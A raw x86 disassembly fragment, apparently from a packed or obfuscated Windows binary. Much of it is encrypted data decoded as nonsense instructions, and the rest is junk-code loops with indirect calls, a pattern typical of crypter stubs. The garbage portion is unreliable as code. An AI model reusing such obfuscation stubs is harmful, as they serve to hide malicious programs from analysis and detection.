  404893:	or     eax,DWORD PTR [edx+ebp*2-0x5c1a8308]
  40489a:	cwde   
  40489b:	enter  0x246f,0x4a
  40489f:	push   edi
  4048a0:	mov    al,0x2a
  4048a2:	nop
  4048a3:	mov    ebp,0xdc55fdd3
  4048a8:	stc    
  4048a9:	push   eax
  4048aa:	test   BYTE PTR [ebx+edi*8-0x1a],dh
  4048ae:	xchg   ebp,eax
  4048af:	mov    bl,0x37
  4048b1:	or     al,0x3e
  4048b3:	and    DWORD PTR [ebp+0x65],0xb28ab875
  4048ba:	sub    DWORD PTR [edi-0x6fa18549],esp
  4048c0:	mov    ah,0x65
  4048c2:	outs   dx,DWORD PTR ds:[esi]
  4048c3:	popf   
  4048c4:	or     ecx,esi
  4048c6:	shl    BYTE PTR [edi+0x6c],cl
  4048c9:	xchg   BYTE PTR [ebp-0x55014f06],al
  4048cf:	inc    ecx
  4048d0:	jmp    0x2bfdc678
  4048d5:	scas   eax,DWORD PTR es:[edi]
  4048d6:	sahf   
  4048d7:	inc    eax
  4048d8:	mov    esp,0xcbaa5197
  4048dd:	adc    edi,DWORD PTR [esi-0x42]
  4048e0:	ret    0xa8f3
  4048e3:	pop    cx
  4048e5:	xor    BYTE PTR [eax+ecx*1-0x3d2f8461],ch
  4048ec:	xor    dl,BYTE PTR [ecx-0x75a1d6bd]
  4048f2:	push   ds
  4048f3:	mov    ds:0xf91649d4,al
  4048f8:	jmp    0xccfc4045
  4048fd:	inc    edx
  4048fe:	fistp  DWORD PTR [esi]
  404900:	sti    
  404901:	(bad)  
  404902:	sti    
  404903:	jbe    0x40490d
  404905:	in     eax,0xbf
  404907:	mov    eax,0x64ea59e0
  40490c:	ins    BYTE PTR es:[edi],dx
  40490d:	dec    bl
  40490f:	push   ecx
  404910:	dec    ebp
  404911:	mov    ecx,0xa4d33501
  404916:	lods   al,BYTE PTR ds:[esi]
  404917:	push   ss
  404918:	and    ah,BYTE PTR [edx+0x5653d897]
  40491e:	jo     0x40490a
  404920:	popf   
  404921:	(bad)  ds:0xc92840fa
  404927:	in     eax,0x13
  404929:	mov    ebp,0x57eeea11
  40492e:	stos   BYTE PTR es:[edi],al
  40492f:	out    dx,eax
  404930:	push   esp
  404931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404932:	dec    ebp
  404933:	in     al,dx
  404934:	cmp    DWORD PTR [edi+0xb184534],esp
  40493a:	fisttp QWORD PTR [edx]
  40493c:	nop
  40493d:	outs   dx,BYTE PTR ds:[esi]
  40493e:	jo     0x404909
  404940:	or     cl,BYTE PTR [eax+0x721ae55c]
  404946:	dec    esi
  404947:	ss inc esp
  404949:	es (bad) 
  40494b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40494c:	pushf  
  40494d:	sbb    eax,0xee6afe5a
  404952:	(bad)  
  404953:	push   edx
  404954:	clc    
  404955:	nop
  404956:	pusha  
  404957:	mov    dh,0xa7
  404959:	les    esi,FWORD PTR [edi+eax*8]
  40495c:	mov    ch,BYTE PTR [ecx-0x1e]
  40495f:	pop    ecx
  404960:	mov    esp,0xbb5527cc
  404965:	stc    
  404966:	or     DWORD PTR [eax+edx*8],esi
  404969:	xchg   DWORD PTR [ebp+esi*8-0x7a82e989],eax
  404970:	xchg   ecx,eax
  404971:	rcl    BYTE PTR [edx+0xb],1
  404974:	not    BYTE PTR [ecx-0x1d]
  404977:	xor    al,0xbf
  404979:	cmp    al,BYTE PTR [esi+ebx*2+0x9263ccf]
  404980:	push   ebp
  404981:	sbb    ebp,DWORD PTR [edi-0x79]
  404984:	fcmovbe st,st(3)
  404986:	mov    al,ds:0x7a362016
  40498b:	mov    eax,ds:0x30a793c2
  404990:	cwde   
  404991:	retf   
  404992:	mov    ds:0x8f91862c,al
  404997:	rcr    DWORD PTR [edx+0x8ff3f06],0x4a
  40499e:	(bad)  
  40499f:	ja     0x404975
  4049a1:	bound  ebx,QWORD PTR [edx+0x4bd58a30]
  4049a7:	lds    ebp,FWORD PTR [ebx+0x21dfba96]
  4049ad:	sub    ch,BYTE PTR [ebx-0x31]
  4049b0:	pop    ebp
  4049b1:	mov    ecx,DWORD PTR [ebx+ecx*2+0x5e]
  4049b5:	ja     0x4049c1
  4049b7:	mov    gs,WORD PTR [ecx-0xc]
  4049ba:	jo     0x404a23
  4049bc:	ins    BYTE PTR es:[edi],dx
  4049bd:	xchg   dx,ax
  4049bf:	cmc    
  4049c0:	mov    al,ds:0xc7042ad7
  4049c5:	mov    dh,0x3
  4049c7:	jno    0x404a06
  4049c9:	outs   dx,BYTE PTR ds:[esi]
  4049ca:	or     ebp,DWORD PTR [ecx]
  4049cc:	mov    eax,ds:0x8d214955
  4049d1:	stc    
  4049d2:	stos   DWORD PTR es:[edi],eax
  4049d3:	mov    esp,DWORD PTR [ebx]
  4049d5:	adc    DWORD PTR [edx-0x7a],ecx
  4049d8:	mov    ds:0x436c0d90,al
  4049dd:	sar    BYTE PTR [ecx+0x33],0x51
  4049e1:	mov    esp,0x139007e8
  4049e6:	lea    esi,[ebp-0x5070e20f]
  4049ec:	xchg   ecx,eax
  4049ed:	(bad)  
  4049f0:	mov    bh,bh
  4049f2:	sbb    al,0xdf
  4049f4:	stos   DWORD PTR es:[edi],eax
  4049f5:	dec    edi
  4049f6:	adc    ch,bh
  4049f8:	or     BYTE PTR ds:0xf99d1a67,cl
  4049fe:	mov    es,WORD PTR [edx]
  404a00:	inc    edx
  404a01:	mov    eax,ds:0xe777a699
  404a06:	imul   ecx,DWORD PTR [eax],0x49
  404a09:	cmp    edi,edx
  404a0b:	pop    esi
  404a0c:	xchg   ebx,eax
  404a0d:	mov    esp,0xeb4d09a4
  404a12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a13:	mov    cl,0xa6
  404a15:	xchg   esi,eax
  404a16:	jl     0x4049c4
  404a18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a19:	sahf   
  404a1a:	lods   eax,DWORD PTR ds:[esi]
  404a1b:	stos   DWORD PTR es:[edi],eax
  404a1c:	mov    dh,0x26
  404a1e:	sbb    dl,BYTE PTR [ecx]
  404a20:	inc    esp
  404a21:	aaa    
  404a22:	push   ds
  404a23:	inc    esi
  404a24:	xchg   ecx,eax
  404a25:	mov    eax,0xb42ebf2
  404a2a:	call   0xe0ca:0x597c67a2
  404a31:	mov    BYTE PTR [edi-0x7fccd0a],al
  404a37:	mov    dh,0x3
  404a39:	sar    DWORD PTR ds:0xeec3c905,cl
  404a3f:	push   ss
  404a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a41:	sub    eax,DWORD PTR [edx-0x4e]
  404a44:	jecxz  0x404a67
  404a46:	fdiv   DWORD PTR [esi-0x4b]
  404a49:	add    eax,0xd3d7efe5
  404a4e:	mov    ds:0x30214f25,eax
  404a53:	cmp    ch,ah
  404a55:	pop    ss
  404a56:	test   DWORD PTR [ebx-0x77],ebp
  404a59:	xor    BYTE PTR [eax],ch
  404a5b:	shr    DWORD PTR [ebx],cl
  404a5d:	or     dl,BYTE PTR [ebp+eiz*2+0x2]
  404a61:	and    BYTE PTR [esi-0x276a22db],dh
  404a67:	mov    cl,0x60
  404a69:	leave  
  404a6a:	jle    0x404ae7
  404a6c:	fcomp  st(1)
  404a6e:	sub    eax,0xccbbad47
  404a73:	jmp    0xee26:0xddf88746
  404a7a:	jno    0x404a87
  404a7c:	push   esp
  404a7d:	sbb    BYTE PTR [ecx-0x1c],al
  404a80:	aas    
  404a81:	(bad)  [esi+0x53da0d41]
  404a87:	mov    ah,0xca
  404a89:	mov    esp,0x22220fd
  404a8e:	js     0x404af2
  404a90:	sub    BYTE PTR ds:0x3f513115,bh
  404a96:	out    0x49,al
  404a98:	mov    ecx,0xcc4c1aa1
  404a9d:	sub    bl,0x1f
  404aa0:	sbb    BYTE PTR [ebx],dl
  404aa2:	jg     0x404a4a
  404aa4:	in     eax,0x86
  404aa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404aa7:	into   
  404aa8:	fsubr  QWORD PTR [ecx+edi*1-0x38]
  404aac:	xlat   BYTE PTR ds:[ebx]
  404aad:	add    edi,DWORD PTR ds:0x217d12bf
  404ab3:	fcom   QWORD PTR [esi-0x3c]
  404ab6:	mov    esp,0x42d09fae
  404abb:	pop    ebx
  404abc:	sbb    eax,0x6f5e0da0
  404ac1:	mov    ebp,0x19e6bbaf
  404ac6:	jae    0x404a96
  404ac8:	(bad)  
  404ac9:	out    dx,al
  404aca:	loopne 0x404b22
  404acc:	sar    dh,0x99
  404acf:	jmp    0x404a63
  404ad1:	jp     0x404b22
  404ad3:	into   
  404ad4:	(bad)  
  404ad5:	fldcw  WORD PTR [esi-0x44]
  404ad8:	push   0x7d5b5df6
  404add:	in     eax,dx
  404ade:	lea    ecx,[ebx+0x15]
  404ae1:	aad    0x62
  404ae3:	xchg   esp,eax
  404ae4:	and    esp,DWORD PTR [ecx]
  404ae6:	ss loopne 0x404b02
  404ae9:	arpl   WORD PTR [ecx+edi*1-0x62],si
  404aed:	iret   
  404aee:	mov    edx,0x5884360f
  404af3:	aaa    
  404af4:	scas   eax,DWORD PTR es:[edi]
  404af5:	enter  0x7af9,0x72
  404af9:	and    al,0x9c
  404afb:	shl    BYTE PTR [edx+0xc61f9a8],1
  404b01:	in     eax,dx
  404b02:	(bad)  
  404b04:	hlt    
  404b05:	cmp    DWORD PTR ds:0x886b3796,0x8caf0501
  404b0f:	js     0x404b89
  404b11:	mov    esp,DWORD PTR [ebp+0x1a]
  404b14:	scas   eax,DWORD PTR es:[edi]
  404b15:	add    al,0xd2
  404b17:	rol    bl,0xd5
  404b1a:	dec    esi
  404b1b:	jbe    0x404a9f
  404b1d:	out    dx,eax
  404b1e:	and    eax,0x8f417f2a
  404b23:	out    0x22,eax
  404b25:	mov    ss,edx
  404b27:	mov    ch,0x32
  404b29:	out    dx,al
  404b2a:	sub    esi,edx
  404b2c:	cmp    bh,bh
  404b2e:	mov    dl,0x69
  404b30:	or     eax,0x4541a03c
  404b35:	movd   DWORD PTR [esi-0x44180e5e],mm7
  404b3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b3d:	xchg   ebp,eax
  404b3e:	leave  
  404b3f:	dec    esi
  404b40:	dec    esi
  404b41:	dec    ebx
  404b42:	sub    al,0x61
  404b44:	mov    bh,0x62
  404b46:	stos   BYTE PTR es:[edi],al
  404b47:	outs   dx,DWORD PTR ds:[esi]
  404b48:	adc    eax,0xa65bbaac
  404b4d:	outs   dx,DWORD PTR ds:[esi]
  404b4e:	(bad)  
  404b4f:	mov    eax,ds:0x57d9410a
  404b54:	test   DWORD PTR [ecx-0x2ebd65e0],edx
  404b5a:	push   0x4febe296
  404b5f:	and    al,al
  404b61:	arpl   cx,sp
  404b63:	sbb    esi,ecx
  404b65:	out    0x8c,al
  404b67:	sub    esp,ebp
  404b69:	sahf   
  404b6a:	icebp  
  404b6b:	enter  0xb1e9,0x1c
  404b6f:	call   0x7ef37352
  404b74:	inc    eax
  404b75:	jge    0x404b31
  404b77:	in     eax,dx
  404b78:	ror    edi,0x88
  404b7b:	push   ss
  404b7c:	cs addr16 popf 
  404b7f:	adc    al,0x6e
  404b81:	ret    
  404b82:	jns    0x404b9d
  404b84:	test   DWORD PTR [esi+0x1d5d2a27],edi
  404b8a:	cmp    BYTE PTR [ebx+0x5ce18686],bl
  404b90:	out    0x7c,al
  404b92:	mov    ch,0xc5
  404b94:	mov    dh,0xea
  404b96:	jno    0x404b88
  404b98:	pop    edi
  404b99:	push   ecx
  404b9a:	mov    ah,0x15
  404b9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b9d:	xchg   esi,eax
  404b9e:	sbb    BYTE PTR [ebp-0x68],dl
  404ba1:	fs xor al,0xaf
  404ba4:	inc    ebx
  404ba5:	test   al,0x50
  404ba7:	fiadd  WORD PTR [esi+esi*8-0xa]
  404bab:	ss or  eax,0xe625cb6a
  404bb1:	sahf   
  404bb2:	xchg   ecx,eax
  404bb3:	push   ds
  404bb4:	popa   
  404bb5:	adc    ebx,DWORD PTR [edi]
  404bb7:	jl     0x404bdf
  404bb9:	clc    
  404bba:	aaa    
  404bbb:	mov    edi,0xb6c6760b
  404bc0:	jmp    DWORD PTR [ebx+0x16bcfa22]
  404bc6:	or     DWORD PTR [ebx+0x70],esi
  404bc9:	test   BYTE PTR [eax+eiz*2+0x7],0x18
  404bce:	aam    0xa2
  404bd0:	lahf   
  404bd1:	mov    cl,0xb8
  404bd3:	nop
  404bd4:	loope  0x404b7a
  404bd6:	inc    esp
  404bd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bd8:	stc    
  404bd9:	daa    
  404bda:	xlat   BYTE PTR ds:[ebx]
  404bdb:	jne    0x404c19
  404bdd:	div    DWORD PTR [ebx+0x41d89bdc]
  404be3:	lock bound ebp,QWORD PTR [ebx-0x73]
  404be7:	inc    ebx
  404be8:	sub    bl,BYTE PTR [esi]
  404bea:	push   edx
  404bec:	test   DWORD PTR [esi+0x56d27425],0x83900df2
  404bf6:	sub    esp,eax
  404bf8:	mov    cl,0x5f
  404bfa:	rcl    DWORD PTR [ecx],0xf4
  404bfd:	jge    0x404be5
  404bff:	stc    
  404c00:	push   ebx
  404c01:	dec    ebp
  404c02:	hlt    
  404c03:	mov    ds:0xb12cf78c,eax
  404c08:	mov    ecx,0xe8611008
  404c0d:	dec    edi
  404c0e:	mov    esp,0x2fd7ab1d
  404c13:	mov    edi,0x2413a1e5
  404c18:	pop    ds
  404c19:	add    DWORD PTR ds:0x503ca70b,ebx
  404c1f:	or     ecx,ecx
  404c21:	jl     0x404bac
  404c23:	mov    ecx,0x2ac4058
  404c28:	mov    cl,0xc8
  404c2a:	sub    al,0x7b
  404c2c:	(bad)  
  404c2d:	ss push ebx
  404c2f:	push   edx
  404c30:	out    0x3,al
  404c32:	push   edx
  404c33:	push   esp
  404c34:	cli    
  404c35:	fst    QWORD PTR ds:0x557850a7
  404c3b:	dec    ebp
  404c3c:	mov    WORD PTR [ebx+0x6c],?
  404c3f:	lahf   
  404c40:	cld    
  404c41:	xor    al,0xe
  404c43:	stc    
  404c44:	pop    ebp
  404c45:	shl    BYTE PTR ds:0x58262677,cl
  404c4b:	pusha  
  404c4c:	mov    edx,0xee6d55e2
  404c51:	adc    ebp,DWORD PTR [edi-0x11d34c43]
  404c57:	lods   eax,DWORD PTR ds:[esi]
  404c58:	or     BYTE PTR [ebx+0x1a46c738],0xf0
  404c5f:	(bad)  
  404c60:	fsub   DWORD PTR [edi+edi*8+0x51]
  404c64:	leave  
  404c65:	dec    esi
  404c66:	pop    es
  404c67:	xor    esi,DWORD PTR [esi-0x6d]
  404c6a:	leave  
  404c6b:	cmc    
  404c6c:	dec    esi
  404c6d:	or     al,0xe2
  404c6f:	adc    al,0x2e
  404c71:	adc    ch,bh
  404c73:	outs   dx,DWORD PTR ds:[esi]
  404c74:	repnz mov bh,0x15
  404c77:	rol    BYTE PTR [edx],0x24
  404c7a:	ins    BYTE PTR es:[edi],dx
  404c7b:	imul   eax,DWORD PTR [edx-0x48],0xb54aeb9e
  404c82:	mov    DWORD PTR [esi],esi
  404c84:	call   0x7bcd:0x29de3fe0
  404c8b:	fsubrp st(1),st
  404c8d:	push   0xffffffe0
  404c8f:	pop    ebx
  404c90:	pop    esi
  404c91:	fsubr  DWORD PTR [ebx-0x72]
  404c94:	fstp   DWORD PTR [ebx]
  404c96:	hlt    
  404c97:	ss xor al,0xde
  404c9a:	daa    
  404c9b:	xor    al,0x74
  404c9d:	les    ebp,FWORD PTR [edi-0x64]
  404ca0:	xchg   ebp,eax
  404ca1:	ss jmp 0x404d20
  404ca4:	jbe    0x404c68
  404ca6:	call   0xc899e09a
  404cab:	fistp  QWORD PTR [eax+0x44]
  404cae:	(bad)  
  404caf:	cli    
  404cb0:	sbb    eax,0xb7eb0ef9
  404cb5:	mov    esp,DWORD PTR [ebx]
  404cb7:	ins    BYTE PTR es:[edi],dx
  404cb8:	in     eax,dx
  404cb9:	or     ebp,DWORD PTR [ebx+ebx*2+0x34]
  404cbd:	imul   ebp,DWORD PTR [ebp-0x52],0xffffffd8
  404cc1:	(bad)  
  404cc2:	mov    edi,0x34b71d50
  404cc7:	clc    
  404cc8:	hlt    
  404cc9:	test   eax,0xef915635
  404cce:	add    ebx,DWORD PTR [esi]
  404cd0:	pop    ds
  404cd1:	ja     0x404cf7
  404cd3:	jmp    0xd64a:0xb8a106f0
  404cda:	jl     0x404d54
  404cdc:	rcr    esp,0xde
  404cdf:	mov    edx,0x70193cea
  404ce4:	inc    edi
  404ce5:	lock mov BYTE PTR [ecx],0x33
  404ce9:	cs dec ebp
  404ceb:	mov    bh,0xa8
  404ced:	mov    ds:0x997550bd,eax
  404cf2:	sbb    ebx,DWORD PTR [ebx+0x48e6d82d]
  404cf8:	test   dl,bh
  404cfa:	mov    bl,0x59
  404cfc:	out    dx,eax
  404cfd:	adc    ebx,DWORD PTR [eax-0x49]
  404d00:	sub    ah,BYTE PTR [ecx+ebp*1]
  404d03:	dec    ebp
  404d04:	aam    0x5
  404d06:	je     0x404d3d
  404d08:	cmp    al,ch
  404d0a:	push   ebp
  404d0b:	sub    bl,BYTE PTR [ebx-0x78]
  404d0e:	leave  
  404d0f:	xlat   BYTE PTR ds:[ebx]
  404d10:	xor    eax,0xde7b997c
  404d15:	mov    al,dh
  404d17:	mov    ch,0xd6
  404d19:	jg     0x404d6f
  404d1b:	out    0x3d,al
  404d1d:	outs   dx,DWORD PTR ds:[esi]
  404d1e:	dec    ebp
  404d1f:	jno    0x404cb1
  404d21:	in     eax,0xc
  404d23:	lods   al,BYTE PTR ds:[esi]
  404d24:	and    BYTE PTR [edx-0x6c1d00a3],0x29
  404d2b:	jp     0x404cd7
  404d2d:	mov    ds:0x3a2bad38,al
  404d32:	and    BYTE PTR ds:0x499f49da,dh
  404d38:	sti    
  404d39:	sti    
  404d3a:	mov    eax,0x1df6d07d
  404d3f:	fyl2xp1 
  404d41:	push   0x21621ded
  404d46:	hlt    
  404d47:	push   ebx
  404d48:	lea    esi,[ebx-0x107eba90]
  404d4e:	aam    0x9f
  404d50:	sub    BYTE PTR [esi+ebp*2+0x4f],al
  404d54:	int3   
  404d55:	xor    al,0xfc
  404d57:	nop
  404d58:	(bad)  
  404d59:	div    ch
  404d5b:	icebp  
  404d5c:	jno    0x404d27
  404d5e:	lods   al,BYTE PTR ds:[esi]
  404d5f:	loop   0x404d76
  404d61:	and    eax,DWORD PTR ds:0x7732b9d3
  404d67:	or     al,0xdf
  404d69:	xchg   esi,eax
  404d6a:	aaa    
  404d6b:	ret    
  404d6c:	mov    DWORD PTR [edi+0x52],edi
  404d6f:	push   ecx
  404d70:	in     al,0x50
  404d72:	les    esi,FWORD PTR ds:0x8592b4b6
  404d78:	xlat   BYTE PTR ds:[ebx]
  404d79:	push   eax
  404d7a:	(bad)  
  404d7b:	mov    edx,0x6414bbb4
  404d80:	add    ah,bl
  404d82:	jle    0x404df4
  404d84:	(bad)  
  404d85:	fild   WORD PTR [esi]
  404d87:	imul   ecx,esp,0x94a0acf9
  404d8d:	shl    BYTE PTR [esi+0x40],0x96
  404d91:	loope  0x404d5f
  404d93:	cmp    eax,0x3c783ea2
  404d98:	test   DWORD PTR [edx+eiz*1],0x36bc720a
  404d9f:	inc    esp
  404da0:	leave  
  404da1:	arpl   WORD PTR [edi+0x24d2ee22],ax
  404da7:	fs push esi
  404da9:	stc    
  404daa:	cmc    
  404dab:	es jle 0x404d8d
  404dae:	inc    ebp
  404daf:	jecxz  0x404d3c
  404db1:	mov    bl,0x5e
  404db3:	push   eax
  404db4:	and    dh,cl
  404db6:	xchg   ebp,eax
  404db7:	iret   
  404db8:	aaa    
  404db9:	jne    0x404d3c
  404dbb:	xchg   esp,eax
  404dbc:	scas   al,BYTE PTR es:[edi]
  404dbd:	and    DWORD PTR fs:[esi+ecx*4],ebx
  404dc1:	pop    ecx
  404dc2:	and    ah,ah
  404dc4:	jb     0x404d5c
  404dc6:	push   ss
  404dc7:	and    BYTE PTR [edx*8-0x3a52897f],al
  404dce:	pushf  
  404dcf:	adc    al,BYTE PTR [ecx]
  404dd1:	iret   
  404dd2:	or     dh,BYTE PTR [eax-0x58fa1955]
  404dd8:	je     0x404e32
  404dda:	cmc    
  404ddb:	inc    ecx
  404ddc:	or     BYTE PTR [edx-0x77],0x46
  404de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404de1:	cmp    al,0xa8
  404de3:	cmp    al,0x7d
  404de5:	pushw  0x42af
  404de9:	rcr    BYTE PTR [esi+0x2b64cda3],1
  404def:	iret   
  404df0:	je     0x404d9a
  404df2:	es int3 
  404df4:	fld    DWORD PTR [edi]
  404df6:	mov    bl,0xfa
  404df8:	je     0x404ed6
  404dfe:	and    eax,DWORD PTR ds:0x42b010
  404e04:	mov    eax,DWORD PTR [ebp+0x14]
  404e07:	and    DWORD PTR ds:0x42901c,0x0
  404e11:	jmp    0x404e23
  404e16:	mov    ebx,DWORD PTR ds:0x42901c
  404e1c:	inc    ebx
  404e1d:	mov    DWORD PTR ds:0x42901c,ebx
  404e23:	cmp    DWORD PTR ds:0x42901c,0x11
  404e2a:	jae    0x404e6a
  404e30:	cmp    DWORD PTR ds:0x42901c,0x1a
  404e37:	jne    0x404e53
  404e3d:	push   DWORD PTR [ebp-0x18]
  404e40:	push   DWORD PTR [ebp-0x28]
  404e43:	push   0x42e0e0
  404e48:	push   0x400000
  404e4d:	call   DWORD PTR ds:0x42e8eb
  404e53:	jmp    0x404e16
  404e58:	mov    ebx,DWORD PTR ds:0x42a01c
  404e5e:	sub    ebx,DWORD PTR ds:0x42d008
  404e64:	mov    DWORD PTR ds:0x42a01c,ebx
  404e6a:	mov    eax,DWORD PTR [eax]
  404e6c:	and    DWORD PTR ds:0x42b01c,0x0
  404e76:	mov    ebx,DWORD PTR ds:0x42b01c
  404e7c:	inc    ebx
  404e7d:	mov    DWORD PTR ds:0x42b01c,ebx
  404e83:	cmp    DWORD PTR ds:0x42b01c,0x6
  404e8a:	jne    0x404e96
  404e90:	call   DWORD PTR ds:0x42e8ef
  404e96:	cmp    DWORD PTR ds:0x42b01c,0x5
  404e9d:	jne    0x404eb2
  404ea3:	xor    ebx,ebx
  404ea5:	or     ebx,DWORD PTR ds:0x42b01c
  404eab:	inc    ebx
  404eac:	mov    DWORD PTR ds:0x42b01c,ebx
  404eb2:	cmp    DWORD PTR ds:0x42b01c,0x12
  404eb9:	jb     0x404e76
  404ebf:	xor    ebx,ebx
  404ec1:	or     ebx,DWORD PTR ds:0x429000
  404ec7:	add    ebx,DWORD PTR ds:0x42d014
  404ecd:	mov    DWORD PTR ds:0x429000,ebx
  404ed3:	mov    DWORD PTR [ebp-0x1c],eax
  404ed6:	mov    eax,ds:0x41cd65
  404edb:	mov    ebx,DWORD PTR ds:0x41ce0c
  404ee1:	sub    ebx,eax
  404ee3:	or     eax,DWORD PTR [eax+ebx*1]
  404ee6:	mov    eax,DWORD PTR [ebp-0x4]
  404ee9:	mov    DWORD PTR ds:0x42900c,0x13
  404ef3:	cmp    DWORD PTR ds:0x42900c,0x0
  404efa:	je     0x404f3f
  404f00:	cmp    DWORD PTR ds:0x42900c,0xa
  404f07:	jne    0x404f13
  404f0d:	call   DWORD PTR ds:0x42e8f3
  404f13:	cmp    DWORD PTR ds:0x42900c,0xb
  404f1a:	jne    0x404f2d
  404f20:	mov    ebx,DWORD PTR ds:0x42900c
  404f26:	dec    ebx
  404f27:	mov    DWORD PTR ds:0x42900c,ebx
  404f2d:	mov    ebx,DWORD PTR ds:0x42900c
  404f33:	dec    ebx
  404f34:	mov    DWORD PTR ds:0x42900c,ebx
  404f3a:	jmp    0x404ef3
  404f3f:	xor    eax,esi
  404f41:	add    ebx,0x5bdd
  404f47:	add    eax,edi
  404f49:	mov    DWORD PTR [ebp-0x8],eax
  404f4c:	and    ebx,eax
  404f4e:	mov    eax,DWORD PTR [ebp-0xc]
  404f51:	sbb    DWORD PTR ds:0x42a000,ecx
  404f57:	xor    eax,esi
  404f59:	add    eax,edi
  404f5b:	and    DWORD PTR ds:0x42b018,0x0
  404f65:	mov    ebx,DWORD PTR ds:0x42b018
  404f6b:	inc    ebx
  404f6c:	mov    DWORD PTR ds:0x42b018,ebx
  404f72:	cmp    DWORD PTR ds:0x42b018,0x1f
  404f79:	jne    0x404f8a
  404f7f:	push   0x42e0ac
  404f84:	call   DWORD PTR ds:0x42e8f7
  404f8a:	cmp    DWORD PTR ds:0x42b018,0x12
  404f91:	jb     0x404f65
  404f97:	mov    DWORD PTR [ebp-0x24],eax
  404f9a:	mov    eax,DWORD PTR [ebp-0x4]
  404f9d:	xor    eax,esi
  404f9f:	add    eax,edi
  404fa1:	mov    DWORD PTR [ebp-0x30],eax
  404fa4:	mov    ebx,DWORD PTR [ebp-0x4]
  404fa7:	mov    eax,ds:0x41cd79
  404fac:	mov    eax,DWORD PTR [eax]
  404fae:	xor    DWORD PTR ds:0x42900c,eax
  404fb4:	xor    ebx,esi
  404fb6:	add    ebx,edi
  404fb8:	mov    DWORD PTR ds:0x42c01c,0x1a
  404fc2:	cmp    DWORD PTR ds:0x42c01c,0x0
  404fc9:	je     0x4050fc
  404fcf:	cmp    DWORD PTR ds:0x42c01c,0x3
  404fd6:	jne    0x404fe7
  404fdc:	push   0x42e018
  404fe1:	call   DWORD PTR ds:0x42e8fb
  404fe7:	cmp    DWORD PTR ds:0x42c01c,0x4
  404fee:	jne    0x404fff
  404ff4:	mov    eax,ds:0x42c01c
  404ff9:	dec    eax
  404ffa:	mov    ds:0x42c01c,eax
  404fff:	mov    eax,ds:0x42c01c
  405004:	dec    eax
  405005:	mov    ds:0x42c01c,eax
  40500a:	jmp    0x404fc2
  40500f:	mov    DWORD PTR ds:0x42b010,0x1e
  405019:	cmp    DWORD PTR ds:0x42b010,0x0
  405020:	je     0x4050fc
  405026:	cmp    DWORD PTR ds:0x42b010,0x29
  40502d:	jne    0x405039
  405033:	call   DWORD PTR ds:0x42e8ff
  405039:	mov    eax,ds:0x42b010
  40503e:	dec    eax
  40503f:	mov    ds:0x42b010,eax
  405044:	jmp    0x405019
  405049:	mov    DWORD PTR ds:0x42a004,0x16
  405053:	cmp    DWORD PTR ds:0x42a004,0x0
  40505a:	je     0x4050fc
  405060:	cmp    DWORD PTR ds:0x42a004,0xb
  405067:	jne    0x405082
  40506d:	push   0x6cef
  405072:	push   0x42a000
  405077:	push   0x4fd9
  40507c:	call   DWORD PTR ds:0x42e903
  405082:	cmp    DWORD PTR ds:0x42a004,0xc
  405089:	jne    0x40509a
  40508f:	mov    eax,ds:0x42a004
  405094:	dec    eax
  405095:	mov    ds:0x42a004,eax
  40509a:	mov    eax,ds:0x42a004
  40509f:	dec    eax
  4050a0:	mov    ds:0x42a004,eax
  4050a5:	jmp    0x405053
  4050aa:	mov    DWORD PTR ds:0x42901c,0x1f
  4050b4:	cmp    DWORD PTR ds:0x42901c,0x0
  4050bb:	je     0x4050fc
  4050c1:	cmp    DWORD PTR ds:0x42901c,0x22
  4050c8:	jne    0x4050e2
  4050ce:	push   DWORD PTR [ebp-0x1c]
  4050d1:	push   0x7ea8
  4050d6:	push   DWORD PTR [ebp-0x10]
  4050d9:	push   DWORD PTR [ebp-0x28]
  4050dc:	call   DWORD PTR ds:0x42e8c3
  4050e2:	mov    eax,ds:0x42901c
  4050e7:	dec    eax
  4050e8:	mov    ds:0x42901c,eax
  4050ed:	jmp    0x4050b4
  4050f2:	and    DWORD PTR ds:0x42d008,0x7d7b
  4050fc:	mov    eax,DWORD PTR [ebp-0x24]
  4050ff:	sub    eax,edi
  405101:	lea    ecx,[ebx-0x3272e2]
  405107:	and    DWORD PTR ds:0x42d00c,0x483b
  405111:	xor    eax,esi
  405113:	sub    DWORD PTR ds:0x42a000,0x7f75
  40511d:	xor    ecx,esi
  40511f:	cmp    ecx,eax
  405121:	mov    DWORD PTR ds:0x429010,0x207a
  40512b:	je     0x405268
  405131:	mov    eax,DWORD PTR [ebp-0x4]
  405134:	add    DWORD PTR ds:0x42a004,0x429018
  40513e:	xor    eax,esi
  405140:	add    eax,edi
  405142:	mov    DWORD PTR ds:0x42d010,0x65f6
  40514c:	cmp    ebx,eax
  40514e:	mov    DWORD PTR ds:0x42b00c,0x5c1b
  405158:	jne    0x405245
  40515e:	or     DWORD PTR ds:0x42a018,0x42d00c
  405168:	push   DWORD PTR [ebp+0x8]
  40516b:	sbb    DWORD PTR ds:0x429020,0x6ddf
  405175:	call   0x402803
  40517a:	mov    DWORD PTR ds:0x42a014,0x17
  405184:	cmp    DWORD PTR ds:0x42a014,0x0
  40518b:	je     0x4051de
  405191:	cmp    DWORD PTR ds:0x42a014,0xc
  405198:	jne    0x4051b2
  40519e:	push   0x42d5
  4051a3:	push   DWORD PTR [ebp-0x20]
  4051a6:	push   DWORD PTR [ebp-0x24]
  4051a9:	push   DWORD PTR [ebp-0x28]
  4051ac:	call   DWORD PTR ds:0x42e8c7
  4051b2:	cmp    DWORD PTR ds:0x42a014,0xd
  4051b9:	jne    0x4051cc
  4051bf:	mov    ecx,DWORD PTR ds:0x42a014
  4051c5:	dec    ecx
  4051c6:	mov    DWORD PTR ds:0x42a014,ecx
  4051cc:	mov    ecx,DWORD PTR ds:0x42a014
  4051d2:	dec    ecx
  4051d3:	mov    DWORD PTR ds:0x42a014,ecx
  4051d9:	jmp    0x405184
  4051de:	mov    DWORD PTR [ebp-0x14],eax
  4051e1:	mov    eax,DWORD PTR [ebp-0x4]
  4051e4:	mov    ecx,DWORD PTR [ebp-0x14]
